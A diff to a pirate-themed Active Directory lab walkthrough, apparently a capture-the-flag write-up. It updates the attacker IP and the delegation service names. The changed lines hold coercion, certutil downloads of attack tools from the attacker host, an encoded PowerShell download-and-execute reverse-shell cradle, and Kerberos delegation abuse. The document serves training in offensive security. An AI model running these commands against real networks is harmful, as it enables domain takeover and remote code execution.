@@ -409,7 +409,7 @@ The strike succeeds through the spoolss RPC path — we're sailing the high seas
 ```zsh
 ➜ nxc smb jollyroger.pirates.brb \
     -u 'morgan' -p 'Entry369@!*' \
-    -M coerce_plus -o LISTENER=192.168.10.131
+    -M coerce_plus -o LISTENER=192.168.10.130
 ```
 
 The relay catches the incoming authentication:
@@ -740,7 +740,7 @@ The reverse shell lands on `QUEENREV` as the SQL service account, with `SeImpers
 ➜ rlwrap -cAr ncat -lnvp 9294
 
 # Potato—Time
-PS > certutil -urlcache -f -split http://192.168.10.131/CrystalPotato.exe potato.exe
+PS > certutil -urlcache -f -split http://192.168.10.130/CrystalPotato.exe potato.exe
 
 PS > .\potato.exe -c 'powershell.exe -ep bypass -nop -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxADAALgAxADMAMAAvAHMAaABlAGwAbAAuAHAAcwAxACIAKQA='
 
@@ -770,7 +770,7 @@ That's the OS flag on `QUEENREV`. The potato climbed the privilege ladder from a
 The final move before the ghost ship is the `QUEENREV$` TGT. SYSTEM owns the Kerberos ticket cache locally, and Rubeus can harvest it from the running session. The `triage` command shows what's in the cache, and the `tgtdeleg` command extracts a delegation-capable TGT for `QUEENREV$`:
 
 ```powershell
-PS > certutil -urlcache -f -split http://192.168.10.131/Rubeus.exe Rubeus.exe
+PS > certutil -urlcache -f -split http://192.168.10.130/Rubeus.exe Rubeus.exe
 
 PS > .\rubeus.exe triage
 ...[snip]...
@@ -827,7 +827,7 @@ That's the mutiny complete. Not a breach of the database server's perimeter — 
 
 ## Phase 3: Navigating the Ghost Ship (Walking the KCD Treaty)
 
-The last ship is the ghost one — `FLYINGDUTCHMAN`, a host that's been cursed to sail forever, unreachable by ordinary means. In the Caribbean, the Flying Dutchman was a ship doomed to sail the oceans forever, never making port, never resting — a ghost story that kept sailors awake in their hammocks. On this network, `FLYINGDUTCHMAN` is a server that's been set up as unreachable by ordinary means: no direct admin access, no planted credential, no obvious service to exploit. But the domain has marked it with a constrained delegation right that bypasses all of that: `QUEENREV$` is allowed to impersonate users on `FLYINGDUTCHMAN`'s HTTP service. That right was there before we arrived. We don't create it. We inherit it, the way you inherit a curse from the ship you board — except in this case the "curse" is a Kerberos right, and the "ship" is a Windows Server 2022 box.
+The last ship is the ghost one — `FLYINGDUTCHMAN`, a host that's been cursed to sail forever, unreachable by ordinary means. In the Caribbean, the Flying Dutchman was a ship doomed to sail the oceans forever, never making port, never resting — a ghost story that kept sailors awake in their hammocks. On this network, `FLYINGDUTCHMAN` is a server that's been set up as unreachable by ordinary means: no direct admin access, no planted credential, no obvious service to exploit. But the domain has marked it with a constrained delegation right that bypasses all of that: `QUEENREV$` is allowed to impersonate users on `FLYINGDUTCHMAN`'s HOST service. That right was there before we arrived. We don't create it. We inherit it, the way you inherit a curse from the ship you board — except in this case the "curse" is a Kerberos right, and the "ship" is a Windows Server 2022 box.
 
 Kerberos Constrained Delegation — KCD — is the mechanism behind this. Unlike RBCD, where the right lives on the target and is written by whoever holds the ACL, KCD is configured on the *source* object: the `msDS-AllowedToDelegateTo` attribute lists the services the account may impersonate. It's a pre-approved delegation treaty, scoped to specific services, historically the more restrictive of the two models. On paper, it's the safer design. In practice, it's a delegation path that's already been opened by whoever configured the domain, and if you hold the right account — or can become the right account — you can walk it. The trust graph is just a treasure map drawn by a drunk architect, and on this map the route to `FLYINGDUTCHMAN` is marked in ink that was dry before we ever got on the first ship.
 
@@ -839,7 +839,7 @@ On `FLYINGDUTCHMAN`, the pre-existing right in the directory is — the pre-exis
 LDAP        192.168.10.10   389    BLACKPEARL       QUEENREV$   Computer    Constrained    host/FLYINGDUTCHMAN.PIRATES.BRB
 ```
 
-That's the constrained delegation edge we found at the start. `QUEENREV$` holds the right to impersonate users on `FLYINGDUTCHMAN`'s HTTP service. Once Phase 2 gives us `QUEENREV$`'s AES keys, we can authenticate as `QUEENREV$` to the KDC and walk the treaty: request the S4U2Self ticket for the HTTP service on `FLYINGDUTCHMAN`, then request the S4U2Proxy ticket to impersonate `Administrator` on that same service — because the constrained delegation right permits the impersonation of any user on that service.
+That's the constrained delegation edge we found at the start. `QUEENREV$` holds the right to impersonate users on `FLYINGDUTCHMAN`'s HOST service. Once Phase 2 gives us `QUEENREV$`'s AES keys, we can authenticate as `QUEENREV$` to the KDC and walk the treaty: request the S4U2Self ticket for the HOST service on `FLYINGDUTCHMAN`, then request the S4U2Proxy ticket to impersonate `Administrator` on that same service — because the constrained delegation right permits the impersonation of any user on that service.
 
 The final leap to the ghost ship doesn't require another relay or a new exploit. The KCD treaty to `FLYINGDUTCHMAN` is already written in the directory. We don't need to write an RBCD rule for this hop; we just need to parley with the KDC using the right account — `QUEENREV$` — and the right keys to authenticate as it. Both of those are the output of Phase 2 and our RBCD foothold on `QUEENREV`.
 
@@ -899,7 +899,7 @@ SMB         queenrev.pirates.brb 445    QUEENREV         [+] PIRATES.BRB\Adminis
 
 For this final leap, we use `QUEENREV$`'s own AES key. We ask for the S4U2Self ticket to `host/FLYINGDUTCHMAN`, and then the S4U2Proxy ticket impersonating `Administrator` on that service. The proxy is allowed because of the pre-existing constrained delegation right.
 
-The trick on this fleet is that the KCD right is to the HTTP service. To make the walk succeed, we use the `-additional-ticket` flag: we reuse the `Administrator@host_QUEENREV` ticket from the RBCD leg as the forwardable ticket for the S4U2Proxy step, bypassing the need for KCD with protocol transition:
+The trick on this fleet is that the KCD right is to the HOST service. To make the walk succeed, we use the `-additional-ticket` flag: we reuse the `Administrator@host_QUEENREV` ticket from the RBCD leg as the forwardable ticket for the S4U2Proxy step, bypassing the need for KCD with protocol transition:
 
 ```zsh
 ➜ getST.py -spn host/FLYINGDUTCHMAN.PIRATES.BRB \
